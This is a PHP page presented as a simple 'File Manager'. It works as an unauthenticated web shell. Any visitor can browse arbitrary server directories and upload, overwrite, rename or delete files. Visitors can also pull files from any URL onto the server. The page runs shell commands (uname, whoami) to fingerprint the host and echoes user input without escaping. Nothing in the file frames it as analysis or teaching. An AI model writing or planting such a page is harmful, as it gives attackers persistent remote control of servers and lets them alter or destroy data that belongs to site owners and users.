<?php
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

function list_files($dir) {
    $files = scandir($dir);
    $filtered_files = array_diff($files, array('.', '..'));
    return $filtered_files;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file_to_upload'])) {
    $file_name = $_FILES['file_to_upload']['name'];
    $file_tmp = $_FILES['file_to_upload']['tmp_name'];

    if (move_uploaded_file($file_tmp, $current_dir . '/' . $file_name)) {
        $message = "File uploaded successfully!";
    } else {
        $message = "Failed to upload file.";
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
}

if (isset($_POST['edit_file']) && isset($_POST['content'])) {
    $file_path = $_POST['edit_file'];

    $backup_dir = $current_dir . '/backup/';
    if (!is_dir($backup_dir)) {
        mkdir($backup_dir, 0777, true);
    }
    copy($file_path, $backup_dir . basename($file_path) . '.bak');

    file_put_contents($file_path, $_POST['content']);
    $message = "File updated successfully!";
    header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
}

if (isset($_GET['delete_file'])) {
    $file_to_delete = $_GET['delete_file'];
    if (file_exists($file_to_delete)) {
        unlink($file_to_delete);
        $message = "File deleted successfully!";
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
}

if (isset($_POST['download_from_url'])) {
    $url = $_POST['url'];
    $filename = $_POST['filename'];

    $file_content = file_get_contents($url);
    if ($file_content !== false) {
        file_put_contents($current_dir . '/' . $filename, $file_content);
        $message = "File downloaded successfully from URL!";
    } else {
        $message = "Failed to download file from URL.";
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
}

if (isset($_POST['rename_file']) && isset($_POST['new_name'])) {
    $file_path = $_POST['rename_file'];
    $new_name = $_POST['new_name'];

    $new_file_path = dirname($file_path) . '/' . $new_name;
    if (rename($file_path, $new_file_path)) {
        $message = "File renamed successfully!";
    } else {
        $message = "Failed to rename file.";
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; }
        .container { width: 80%; margin: 0 auto; }
        header { background-color: #4CAF50; color: white; padding: 10px 0; text-align: center; }
        nav { background-color: #333; overflow: hidden; }
        nav a { color: white; padding: 14px 20px; text-decoration: none; display: inline-block; }
        nav a:hover { background-color: #ddd; color: black; }
        .file-list { margin-top: 20px; }
        table { width: 100%; border-collapse: collapse; }
        table th, table td { padding: 10px; text-align: left; border: 1px solid #ddd; }
        table th { background-color: #4CAF50; color: white; }
        .upload-form, .edit-form, .search-form, .url-form { margin-top: 30px; background-color: #f4f4f4; padding: 15px; border-radius: 5px; }
        .upload-form form input, .url-form form input { padding: 5px; }
        .upload-form form button, .url-form form button { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
        .upload-form form button:hover, .url-form form button:hover { background-color: #45a049; }
        .edit-form textarea { width: 100%; height: 300px; }
        .search-form input { padding: 8px; width: 200px; }
        .info { background-color: #f9f9f9; padding: 10px; margin-top: 20px; border: 1px solid #ddd; }
        .directory-link { color: #4CAF50; text-decoration: none; }
        .directory-link:hover { text-decoration: underline; }
        .pwd { margin-top: 20px; background-color: #f9f9f9; padding: 10px; border: 1px solid #ddd; }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>File Manager</h1>
    </header>

    <div class="upload-form">
        <h2>Upload File</h2>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="file_to_upload" required><br><br>
            <button type="submit">Upload</button>
        </form>
    </div>

    <div class="file-list">
        <h2>Files in Directory: <?php echo $current_dir; ?></h2>

        <form class="search-form" method="GET">
            <input type="text" name="search" value="<?php echo isset($_GET['search']) ? $_GET['search'] : ''; ?>" placeholder="Search...">
            <button type="submit">Search</button>
        </form>

        <table>
            <thead>
                <tr>
                    <th>Filename</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $files = list_files($current_dir);
                foreach ($files as $file):
                ?>
                    <tr>
                        <td>
                            <?php if (is_dir($current_dir . '/' . $file)): ?>
                                <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir . '/' . $file); ?>" class="directory-link"><?php echo $file; ?></a>
                            <?php else: ?>
                                <?php echo $file; ?>
                            <?php endif; ?>
                        </td>
                        <td>
                            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>&delete_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Delete</a>
                            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>&edit_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Edit</a>
                            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>&rename_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Rename</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <div class="edit-form">
        <h2>Rename File</h2>
        <?php if (isset($_GET['rename_file'])): ?>
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST">
                <input type="hidden" name="rename_file" value="<?php echo $_GET['rename_file']; ?>">
                <input type="text" name="new_name" placeholder="New file name" required><br><br>
                <button type="submit">Rename</button>
            </form>
        <?php endif; ?>
    </div>

    <div class="edit-form">
        <h2>Edit File</h2>
        <?php if (isset($_GET['edit_file'])): ?>
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST">
                <input type="hidden" name="edit_file" value="<?php echo $_GET['edit_file']; ?>">
                <textarea name="content" placeholder="Edit your file content here..."><?php echo file_get_contents($_GET['edit_file']); ?></textarea><br><br>
                <button type="submit">Save Changes</button>
            </form>
        <?php endif; ?>
    </div>

    <div class="url-form">
        <h2>Download from URL</h2>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST">
            <input type="text" name="url" placeholder="Enter URL" required><br><br>
            <input type="text" name="filename" placeholder="Save as filename" required><br><br>
            <button type="submit" name="download_from_url">Download</button>
        </form>
    </div>

    <div class="pwd">
        <h2>Current Directory</h2>
        <p><?php echo $current_dir; ?></p>
    </div>

    <div class="info">
        <h2>Server Information</h2>
        <p><strong>System Info (uname -a): </strong> <?php echo shell_exec('uname -a'); ?></p>
        <p><strong>User Info (whoami): </strong> <?php echo shell_exec('whoami'); ?></p>
        <p><strong>IP Address: </strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
    </div>

</div>

</body>
</html>
